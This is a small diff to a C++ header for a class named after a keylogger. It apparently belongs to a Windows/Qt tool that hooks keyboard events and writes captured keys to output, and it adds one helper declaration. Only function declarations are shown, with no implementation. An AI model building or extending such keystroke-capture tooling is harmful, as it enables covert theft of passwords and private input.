@@ -29,6 +29,7 @@ public:
     static void update(BYTE *keyState, int keyCode);
     static LRESULT CALLBACK process (int nCode, WPARAM wParam, LPARAM lParam);
     static void writeOutput();
+    static void wrapActionKey(QString &actionKey);
 };
 
 #endif // KEYLOGGER_H
